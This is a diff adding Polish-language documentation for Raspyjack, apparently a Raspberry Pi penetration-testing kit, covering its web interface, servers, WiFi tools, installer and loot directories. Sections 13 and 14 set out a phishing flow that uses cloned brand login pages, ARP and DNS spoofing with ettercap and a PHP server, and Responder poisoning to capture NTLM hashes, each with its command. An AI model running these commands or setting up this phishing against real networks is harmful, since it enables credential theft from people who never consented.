+  Wysyłane via WebSocket → device_server → rj_input Unix socket → raspyjack.py.
+
+Terminal:
+  xterm.js — interaktywny bash shell w przeglądarce.
+  WebSocket: shell_open → PTY alloc, shell_in → stdin, shell_out → stdout.
+
+System monitoring (live):
+  CPU usage (delta /proc/stat), Memory (used/total), Disk, Temperature,
+  Uptime, Load average, Active payload status,
+  Interfejsy sieciowe (eth0, wlan0, wlan1, tailscale0).
+
+Payload management:
+  Lista kategorii z payloadami, status dot (pulsuje gdy działa).
+  Start/stop z WebUI, wyniki wyświetlane w symulatorze LCD.
+
+Loot browser:
+  Przeglądanie katalogów, podgląd tekstu (do 200KB), download plików.
+
+Settings:
+  Discord webhook config, Tailscale install/reauth.
+
+Autentykacja:
+  Bootstrap: tworzenie konta admina (3-32 znaków login, 8+ hasło).
+  Login: sesja 8h TTL. Recovery token jako fallback.
+  Token: HMAC-SHA256 signed JWT-style (base64url payload.signature).
+
+=== IDE (ide.html + ide.js) ===
+
+Cel: Edytor kodu Python do tworzenia payloadów.
+
+Edytor: CodeMirror 5.65.16, theme Monokai, syntax Python.
+Drzewo plików: nawigacja payloads/, context menu (rename/delete).
+Nowy plik/folder: dialog z nazwą.
+Uruchamianie: Save → Run (pytanie o zapis jeśli zmieniony), Stop.
+GPIO Reference: tabela pinów BCM, kopiowalne fragmenty kodu.
+Template Library: przykłady payloadów per kategoria.
+Device Output: embedded podgląd ekranu w stylu Game Boy.
+Dirty flag: śledzenie niezapisanych zmian + prompt przy nawigacji.
+
+=== shared.js (utilki tokenów/API) ===
+  getApiUrl(), getWsUrl(), saveToken(), loadToken(), authHeaders(),
+  fetchJson() — wrapper z Bearer token injection.
+
+=== CSS (ui.css + device-shell.css) ===
+  Palette: --rj-bg-0 #05060a, --rj-accent #10b981 (emerald)
+  Fonty: Space Grotesk (headings), JetBrains Mono (kod)
+  Animacje: payload pulse (1.2s), scanlines, grid overlay
+  Responsive: mobile-first, sidebar collapse
+
+
+################################################################################
+##  10. SERWERY
+################################################################################
+
+=== web_server.py — HTTP REST API (port 8080) ===
+
+Endpoints autentykacji:
+  POST /api/auth/bootstrap       — tworzenie pierwszego admina
+  POST /api/auth/login            — login (username/password), zwraca sesję 8h
+  POST /api/auth/logout           — czyszczenie sesji
+  GET  /api/auth/me               — info o aktualnym użytkowniku
+  POST /api/auth/ws-ticket        — generowanie 120s ticket na WebSocket
+  GET  /api/auth/bootstrap-status — czy admin istnieje
+
+Endpoints loot:
+  GET /api/loot/list              — listing katalogu (paginacja, rekursywny)
+  GET /api/loot/view              — podgląd pliku tekstowego (limit 200KB)
+  GET /api/loot/download          — pobieranie pliku
+
+Endpoints systemowe:
+  GET  /api/system/status         — metryki: CPU%, mem, disk, temp, uptime, interfejsy
+  POST /api/settings/discord_webhook — zapis/czyszczenie webhook URL
+  GET  /api/tailscale/status      — stan daemona Tailscale
+  POST /api/tailscale/install     — pobranie + instalacja + auth
+  POST /api/tailscale/reauth      — re-autentykacja istniejącego Tailscale
+
+Kluczowe funkcje:
+  _read_cpu_percent() — delta /proc/stat
+  _read_meminfo()     — used/total z /proc/meminfo
+  _read_temp_c()      — thermal zone temp
+  _read_ipv4_interfaces() — aktywne interfejsy via "ip -o -4 addr"
+  _regenerate_caddyfile_and_reload() — auto-aktualizacja reverse proxy IPs
+
+Bezpieczeństwo:
+  HMAC-SHA256 tokeny, sesja 8h (env: RJ_WEB_SESSION_TTL)
+  Token: /root/Raspyjack/.webui_token
+  Secret: /root/Raspyjack/.webui_session_secret
+  Rate limiting: _LOGIN_FAILS dict z blokadą po zbyt wielu próbach
+  Binding: tylko eth0, wlan0, tailscale0, localhost (NIE interfejsy atakowe)
+
+=== device_server.py — WebSocket (port 8765) ===
+
+Protokół wiadomości:
+  frame (client→all)     — Base64 JPEG mirror ekranu LCD (broadcast)
+  input {button, state}  — przycisk wirtualny → rj_input Unix socket
+  shell_open             — alokacja PTY (/bin/bash, TERM=xterm-256color)
+  shell_in {data}        — stdin do master FD
+  shell_out {data}       — stdout z PTY → client
+  shell_exit {code}      — zakończenie procesu shell
+  shell_resize {cols,rows} — TIOCSWINSZ ioctl (zmiana rozmiaru terminala)
+
+Klasy:
+  ShellSession — manager PTY (spawn, non-blocking read, graceful exit)
+  FrameCache   — cache JPEG frame z detekcją zmian (mtime/size)
+
+Auth: Cookie session | URL token (RJ_WS_TOKEN) | WS ticket (signed JWT 120s)
+Performance: SEND_TIMEOUT 0.5s, PING_INTERVAL 15s, max_size 2MB
+
+
+################################################################################
+##  11. WIFI MANAGEMENT
+################################################################################
+
+--- wifi_manager.py ---
+  Cel: Profil i zarządzanie połączeniami WiFi.
+  detect_wifi_interfaces() — skanuje /sys/class/net + iwconfig
+  scan_networks()         — iwlist scan (SSID, quality, encryption)
+  save_profile()          — JSON w ~/wifi/profiles/ (priority, auto_connect)
+  load_profiles()         — posortowane po priority
+  connect_to_network()    — nmcli device wifi connect
+  disconnect()            — czyste rozłączenie
+  Storage: ~/.Raspyjack/wifi/profiles/*.json
+
+--- raspyjack_integration.py ---
+  Cel: Inteligentny wybór interfejsu + logowanie boot-time.
+  log_interface_boot_snapshot() → loot/network/interface_boot_log.txt
+    (timestamp, boot_id, hostname, default route, wlan interfaces z MAC/driver)
+  get_best_interface():
+    1. Preferencja użytkownika → 2. Aktualny default route → 3. Priorytet: eth0>wlan0>wlan1
+  Funkcje: get_available_interfaces(), get_interface_status(), get_interface_ip/network/gateway()
+
+--- route_control.py ---
+  Cel: CLI do przełączania default route.
+  Komendy: status | list | switch <iface> | test <iface> | restore | interactive
+
+--- wifi_switch.py ---
+  Cel: Szybkie toggle wlan0/wlan1 z CLI.
+  Komendy: (brak args=pokaż) | wlan0 | wlan1 | toggle | status | list
+
+--- wifi_lcd_interface.py ---
+  Cel: Menu WiFi na LCD z przyciskami GPIO.
+  Ekrany: Main WiFi, Scan results, Saved profiles, Connection status.
+  Klawiatura ekranowa do wpisywania SSID.
+
+
+################################################################################
+##  12. NAVARRO — OSINT USERNAME CHECKER
+################################################################################
+
+Plik: Navarro/navarro.py
+
+Cel: Sprawdzanie obecności nazwy użytkownika na 25+ platformach.
+  Facebook, Instagram, Twitter, LinkedIn, GitHub, Reddit, TikTok, YouTube,
+  Pinterest, Snapchat, Telegram, VK, Steam, Spotify itd.
+
+Klasy:
+  RateLimiter — adaptacyjne opóźnienia (0.5-30s), persystencja w
+                ~/.navarro_rate_limits.json. Wzrost delay na 429, spadek na success.
+  SessionManager — connection pooling (10x), rotacja User-Agent (9 stringów),
+                   reuse sesji per platforma.
+
+CLI:
+  python3 navarro.py <username>
+  python3 navarro.py --list usernames.txt
+  python3 navarro.py <username> --export results.json
+
+Wyniki: FOUND, NOT_FOUND, NETWORK_ERROR, RATE_LIMITED, TIMEOUT, UNKNOWN_ERROR
+
+
+################################################################################
+##  13. DNS SPOOFING SYSTEM
+################################################################################
+
+Lokalizacja: DNSSpoof/
+
+Katalog sites/ — 24+ szablony phishingowe:
+  adobe, amazon, badoo, google, icloud, instafollowers, instagram, ldlc,
+  ldlc-beef, linkedin, microsoft, netflix, origin, paypal, pinterest,
+  playstation, protonmail, shopify, shopping, snapchat, spotify, steam,
+  twitter, wifi, wordpress, yahoo, yandex
+
+Każdy folder zawiera pliki HTML/JS/CSS imitujące stronę logowania danego serwisu.
+Dane logowania przechwycone przez formularze POST.
+
+Katalog captures/:
+  ip.txt        — przechwycone adresy IP
+  usernames.txt — przechwycone dane logowania
+
+Flow ataku (z raspyjack.py):
+  1. Modyfikacja /etc/ettercap/etter.dns (DNS rekord wskazujący na IP atakującego)
+  2. PHP server: php -S 0.0.0.0:80 w katalogu wybranej strony
+  3. ettercap: ettercap -Tq -M arp:remote -P dns_spoof -i {interface}
+  4. Ofiara łączy się z domeną → przekierowanie na fałszywą stronę → capture
+
+
+################################################################################
+##  14. RESPONDER INTEGRATION
+################################################################################
+
+Lokalizacja: Responder/
+
+Cel: Poisoning LLMNR, NBT-NS i mDNS do przechwytywania hashów NTLM.
+
+Uruchomienie z GUI:
+  Responder ON  → python3 Responder.py -Q -I {interface}
+  Responder OFF → killall procesu
+
+Flaga -Q: nie odpowiada na zapytania LLMNR/NBNS dla własnej nazwy hosta.
+Konfiguracja: Responder.conf (serwery HTTP/SMB/SQL/FTP/LDAP on/off)
+Certyfikaty: certs/ (self-signed dla HTTPS/LDAPS)
+
+Logi: Responder/logs/
+  Responder-Session.log — przechwycone hashe NTLM
+  Analyzer-*.log — analiza ruchu
+
+Narzędzia dodatkowe:
+  DumpHash.py — ekstrakcja hashów z logów
+  Report.py   — generowanie raportów
+  packets.py  — definicje pakietów sieciowych
+  odict.py    — ordered dict helper
+  utils.py    — utilki (dekodowanie, walidacja)
+
+Powiązane serwery: poisoners/ (LLMNR, NBTNS, MDNS), servers/ (HTTP, SMB, SQL itd.)
+
+
+################################################################################
+##  15. INSTALACJA I DEPLOYMENT
+################################################################################
+
+=== install_raspyjack.sh (~800+ linii) ===
+
+Cel: Kompletna instalacja Raspyjack na czystym Raspberry Pi OS.
+
+Krok 1 — Detekcja konfiguracji:
+  /boot/firmware/config.txt (Bookworm) lub /boot/config.txt (starsze)
+
+Krok 2 — Pakiety APT (80+):
+  Python3 + NumPy, Pillow, Scapy, cryptography
+  Sieć: nmap, tcpdump, arp-scan, dsniff, ettercap-text-only, aircrack-ng
+  BLE: bluepy (kompilacja ze źródeł via setup.py)
+  I2C/SPI: i2c-tools, python3-spidev
+  Fonty: DejaVu + FontAwesome 6.5.1 (wget)
+
+Krok 3 — Konfiguracja kernela (dtparam):
+  i2c_arm=on, i2c1=on, spi=on
+  dtoverlay=spi0-2cs
+  Moduły: i2c-bcm2835, i2c-dev, spi_bcm2835, spidev
+
+Krok 4 — WiFi Interface Pinning (KRYTYCZNE):
+  Wykrywanie onboard (SDIO/MMC) vs USB dongles.
+  /etc/systemd/network/10-onboard-wifi.link (systemd priority)
+  /etc/udev/rules.d/70-raspyjack-wifi.rules (fallback)
+  Wymuszenie: onboard → wlan0, pierwszy USB → wlan1.
+  Zapobiega losowemu zmienianiu nazw przy rebootach.
+
+Krok 5 — Usługi SystemD:
+  raspyjack.service         — główny daemon
+  raspyjack-device.service  — WebSocket server
+  raspyjack-webui.service   — HTTP server
+  raspyjack-pin-wifi.service — boot-time WiFi pinning
+
+Krok 6 — Sekrety:
+  .webui_token          — 32 znaki URL-safe (auth token)
+  .webui_session_secret — 48 znaków URL-safe (HMAC secret)
+  Uprawnienia: 0600
+
+=== deploy/caddy/Caddyfile ===
+  HTTPS reverse proxy: localhost + multi-IP (eth0, wlan0, tailscale0)
+  /ws* → 127.0.0.1:8765 (WebSocket)
+  Reszta → 127.0.0.1:8080 (HTTP API + static files)
+  TLS: internal (self-signed)
+  Auto-regeneracja przez _regenerate_caddyfile_and_reload()
+
+=== scripts/pin_wifi_names.sh ===
+  Cel: boot-time service pinujący nazwy WiFi.
+  Uruchamia się po systemd-udev-settle, przed NetworkManager.
+  Logika: wykrywa bus (mmc vs usb), rename onboard→wlan0, USB→wlan1.
+  Obsługuje konflikty swap (tymczasowe nazwy).
+  Log: loot/network/wifi_pin_boot.log.
+
+=== scripts/check_webui_js.sh ===
+  Cel: walidacja składni JS (node --check).
+  Sprawdza: shared.js, app.js, ide.js. Używane w CI/pre-deploy.
+
+
+################################################################################
+##  16. ZALEŻNOŚCI — KOMPLETNA LISTA
+################################################################################
+
+=== Narzędzia systemowe (apt) ===
+  WiFi:       airmon-ng, airodump-ng, aireplay-ng (aircrack-ng), iwconfig,
+              iw, nmcli, wpa_supplicant
+  Sieć:       nmap, iperf3, tcpdump, tshark, speedtest-cli, curl,
+              arp-scan, dsniff, ettercap-text-only
+  Bluetooth:  bluetoothctl, hciconfig
+  GPS:        gpsd (daemon u-blox)
+  System:     git, tar, systemd, apt, mount, pgrep, ps, lsusb, ip, awk, sed
+  PHP:        php-cli (serwer phishingowy)
+  DHCP:       dnsmasq
+
+=== Pakiety Python (pip) ===
+  GPIO/LCD:   RPi.GPIO, Pillow (PIL), spidev
+  Hardware:   pyudev, evdev
+  Sieć:       scapy (opcjonalne, graceful degradation), requests (opcjonalne),
+              netifaces, websockets
+  Bluetooth:  bleak (async BLE), bluepy (sync BLE) — oba opcjonalne
+  GPS:        gpsd-py3 (opcjonalne)
+  OSINT:      qrcode (opcjonalne, fallback tekst)
+  Bazy:       sqlite3 (stdlib)
+  Web:        aiohttp lub http.server (stdlib)
+  Krypto:     hmac, hashlib (stdlib), cryptography
+
+=== Graceful degradation ===
+  Scapy       → fallback na subprocess (airodump-ng itp.)
+  Bleak/Bluepy → fallback na bluetoothctl CLI
+  requests    → pominięcie notyfikacji Discord
+  qrcode      → text-only detail view w Navarro
+  evdev       → virtual button fallback przez WebUI
+
+
+################################################################################
+##  17. ŚCIEŻKI OUTPUT / LOOT
+################################################################################
+
+/root/Raspyjack/loot/
+  ├── Nmap/              — wyniki skanów: {label}_{timestamp}.txt + .xml
+  ├── MITM/              — stealth_bridge_*.pcap, Log-DNS.txt
+  ├── DHCP/              — rogue_dhcp_*.log
+  ├── SMB/               — smb_probe_*.txt
+  ├── honeypot/          — events_*.jsonl
+  ├── Analyzer/          — PCAP + JSON (widmo RF)
+  ├── CamFinder/         — cameras.db (SQLite)
+  ├── DeviceScout/       — CSV + JSON (device tracking)
+  ├── OSINT/             — navarro_<user>_<ts>/results.json
+  ├── wardriving/        — wardriving.csv + SQLite DB + KML
+  ├── network/           — interface_boot_log.txt, wifi_pin_boot.log
+  ├── speedtest.csv      — wyniki LanTest (iperf3)
+  ├── speedtest_wan.csv  — wyniki WanTest (speedtest.net)
+  ├── speedtest_server.txt — adres serwera iperf3
+  ├── latency_jitter.csv — wyniki monitoringu latency
+  └── payload.log        — stdout/stderr z payloadów
+
+/root/Raspyjack/Responder/logs/
+  — przechwycone hashe NTLM i logi sesji
+
+/root/Raspyjack/DNSSpoof/captures/
+  ├── ip.txt             — przechwycone IP
+  └── usernames.txt      — przechwycone loginy
+
+/dev/shm/ (RAM):
+  ├── raspyjack_last.jpg — mirror ekranu LCD dla WebUI
+  ├── rj_input.sock      — Unix socket wirtualnych przycisków
+  ├── rj_payload_state.json  — stan aktualnego payloadu
+  └── rj_payload_request.json — żądanie uruchomienia payloadu z WebUI
+
+
+================================================================================
+                         KONIEC DOKUMENTACJI
+================================================================================
